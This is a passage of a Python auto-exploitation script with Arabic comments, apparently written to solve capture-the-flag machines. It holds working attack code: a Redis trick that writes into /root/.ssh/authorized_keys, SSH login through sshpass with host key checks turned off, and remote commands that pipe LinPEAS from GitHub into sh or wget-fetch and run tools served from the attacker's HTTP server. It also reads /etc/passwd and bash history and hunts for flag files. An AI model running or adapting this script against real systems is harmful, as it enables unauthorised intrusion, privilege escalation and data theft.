                self.run_command(f"(echo 'config set dir /root/.ssh'; echo 'config set dbfilename authorized_keys'; echo 'save') | redis-cli -h {self.target} -p {port}")

    def exploit_mongodb(self, port):
        """هجمات MongoDB"""
        if os.path.exists("/usr/bin/mongo"):
            mongo_out = self.run_command(f"echo 'show dbs' | mongo {self.target}:{port} > {self.session_dir}/mongo_dbs.txt")

    def exploit_oracle(self, port):
        """هجمات Oracle باستخدام ODAT"""
        if os.path.exists("/usr/bin/odat"):
            self.log_step("ODAT - فحص Oracle")
            odat_out = self.run_command(f"odat all -s {self.target} -p {port} > {self.session_dir}/odat.txt")

    def search_exploit(self, service, port):
        """البحث في searchsploit عن استغلال"""
        if os.path.exists("/usr/bin/searchsploit"):
            self.log_step(f"Searchsploit - البحث عن {service}")
            search_out = self.run_command(f"searchsploit {service} > {self.session_dir}/searchsploit_{service}.txt")
            
            # إذا وجد استغلال، محاولة استخدام metasploit
            if os.path.exists("/usr/bin/msfconsole"):
                self.log_step("Metasploit - محاولة استغلال تلقائي")
                # يمكن إضافة منطق أكثر تعقيداً هنا

    # ========== المرحلة 4: الحصول على شيل ==========
    def get_shell_via_ssh(self, user, password, port):
        """الاتصال عبر SSH"""
        self.log_step("محاولة الاتصال عبر SSH")
        # اختبار الاتصال
        test_cmd = f"sshpass -p '{password}' ssh -o StrictHostKeyChecking=no -p {port} {user}@{self.target} 'whoami'"
        output = self.run_command(test_cmd)
        if user in output:
            self.log_step("اتصال SSH ناجح")
            self.shell = f"ssh {user}@{self.target} -p {port}"
            return True
        return False

    # ========== المرحلة 5: رفع الصلاحيات ==========
    def privesc_all(self):
        """رفع الصلاحيات باستخدام أدوات متعددة"""
        if not self.shell:
            self.log_step("لا يوجد شيل، تخطي رفع الصلاحيات")
            return
        
        self.log_step("بدء رفع الصلاحيات")
        
        # 1. unix-privesc-check
        if os.path.exists("/usr/bin/unix-privesc-check"):
            self.log_step("Unix-privesc-check - فحص الإعدادات")
            # رفع الأداة إلى الجهاز الهدف
            upc_cmd = f"{self.shell} 'wget -q http://{self.get_local_ip()}:8000/unix-privesc-check -O /tmp/upc && chmod +x /tmp/upc && /tmp/upc standard'"
            # نحتاج لخادم HTTP محلي
            threading.Thread(target=self.start_http_server).start()
            time.sleep(2)
            upc_out = self.run_command(upc_cmd)
            self.save_output("unix_privesc_check.txt", upc_out)
        
        # 2. LinPEAS
        self.log_step("LinPEAS - فحص متقدم")
        linpeas_cmd = f"{self.shell} 'curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh'"
        linpeas_out = self.run_command(linpeas_cmd)
        self.save_output("linpeas.txt", linpeas_out)
        
        # 3. Linux Exploit Suggester
        self.log_step("Linux Exploit Suggester")
        les_cmd = f"{self.shell} 'wget -q http://{self.get_local_ip()}:8000/linux-exploit-suggester.sh -O /tmp/les.sh && chmod +x /tmp/les.sh && /tmp/les.sh'"
        les_out = self.run_command(les_cmd)
        self.save_output("linux_exploit_suggester.txt", les_out)
        
        # 4. جمع معلومات النظام
        info_commands = [
            "sudo -l",
            "find / -perm -4000 -type f 2>/dev/null",
            "cat /etc/crontab",
            "cat /etc/passwd",
            "uname -a",
            "cat /etc/*-release",
            "ps aux",
            "netstat -tulpn",
            "cat ~/.bash_history",
            "ls -la /home/*/.*",
            "find / -name '*flag*' 2>/dev/null"
        ]
        for cmd in info_commands:
            out = self.run_command(f"{self.shell} '{cmd}'")
            self.save_output(f"info_{cmd.replace(' ', '_')}.txt", out)
    
    def get_local_ip(self):
        """الحصول على IP المحلي لخادم HTTP"""
        try:
            ip = self.run_command("ip -4 addr show tun0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}'").strip()
            if not ip:
                ip = self.run_command("hostname -I | awk '{print $1}'").strip()
            return ip
        except:
            return "127.0.0.1"
    
    def start_http_server(self):
        """تشغيل خادم HTTP لمشاركة الأدوات"""
        os.chdir(self.session_dir)
        self.run_command("python3 -m http.server 8000 > /dev/null 2>&1")

    # ========== المرحلة 6: البحث عن العلم ==========
    def search_all_flags(self):
        """البحث الشامل عن user.flag و root.flag"""
        self.log_step("بدء البحث عن الأعلام")
        
        if self.shell:
            # أوامر بحث متعددة
            search_commands = [
                "find / -name 'user.flag' -type f -exec cat {} \\; 2>/dev/null",
                "find / -name 'root.flag' -type f -exec cat {} \\; 2>/dev/null",
                "find / -name '*flag*' -type f -exec cat {} \\; 2>/dev/null | head -5",
                "cat /root/root.flag 2>/dev/null",
                "cat /root/root.txt 2>/dev/null",
                "cat /home/*/user.flag 2>/dev/null",
                "cat /home/*/user.txt 2>/dev/null",
                "cat /var/www/html/flag.txt 2>/dev/null",
                "cat /tmp/flag.txt 2>/dev/null"
            ]
            
            for cmd in search_commands:
                out = self.run_command(f"{self.shell} '{cmd}'")
                if out and len(out.strip()) > 0 and "No such file" not in out:
                    if "user.flag" in cmd or "user.txt" in cmd:
                        self.user_flag = out.strip()
                        self.log_step(f"وجدنا user.flag: {self.user_flag}")
                    elif "root.flag" in cmd or "root.txt" in cmd:
                        self.root_flag = out.strip()
                        self.log_step(f"وجدنا root.flag: {self.root_flag}")
                    else:
                        self.log_step(f"وجدنا ملف علم محتمل: {out[:100]}")
        else:
            self.log_step("لا يوجد شيل، تخطي البحث عن الأعلام")

    # ========== التشغيل الرئيسي ==========
    def run(self):
        """تشغيل جميع المراحل بالتسلسل"""
        self.log_step(f"بدء الهجوم التلقائي على {self.target}")
        
        # المرحلة 1: الاستطلاع
        self.recon_all()
        
        # المرحلة 2: تحليل الويب
        for port, service in self.services.items():
            if 'http' in service or 'https' in service:
                protocol = 'https' if 'https' in service else 'http'
                self.web_analysis(port, protocol)
        
        # المرحلة 3: استغلال الخدمات
        self.exploit_services()
        
        # إذا لم نحصل على شيل من الخدمات، حاول هجمات إضافية
        if not self.shell:
            self.log_step("محاولة هجمات إضافية...")
            # يمكن إضافة المزيد هنا
        
        # المرحلة 4: رفع الصلاحيات والبحث عن العلم
        if self.shell:
            self.privesc_all()
            self.search_all_flags()
        
        # عرض النتائج النهائية
        self.show_results()
    
    def show_results(self):
        """عرض النتائج النهائية"""
        print(f"\n{Colors.GREEN}{Colors.BOLD}{'='*60}{Colors.ENDC}")
        print(f"{Colors.GREEN}{Colors.BOLD}=== النتائج النهائية ==={Colors.ENDC}")
        print(f"{Colors.GREEN}{Colors.BOLD}{'='*60}{Colors.ENDC}")
        
        print(f"{Colors.BOLD}الهدف:{Colors.ENDC} {self.target}")
        print(f"{Colors.BOLD}المنافذ المفتوحة:{Colors.ENDC} {', '.join(self.ports) if self.ports else 'لا شيء'}")
        print(f"{Colors.BOLD}الخدمات:{Colors.ENDC}")
        for port, service in self.services.items():
            print(f"  - {port}: {service}")
        
        print(f"\n{Colors.BOLD}الدلائل المكتشفة:{Colors.ENDC}")
        for d in self.web_dirs[:10]:
            print(f"  - {d}")
        
        print(f"\n{Colors.BOLD}الأعلام:{Colors.ENDC}")
        if self.user_flag:
            print(f"  {Colors.GREEN}user.flag: {self.user_flag}{Colors.ENDC}")
        else:
            print(f"  {Colors.FAIL}user.flag: غير موجود{Colors.ENDC}")
        
        if self.root_flag:
            print(f"  {Colors.GREEN}root.flag: {self.root_flag}{Colors.ENDC}")
        else:
            print(f"  {Colors.FAIL}root.flag: غير موجود{Colors.ENDC}")
        
        print(f"\n{Colors.CYAN}تم حفظ جميع المخرجات في: {self.session_dir}{Colors.ENDC}")

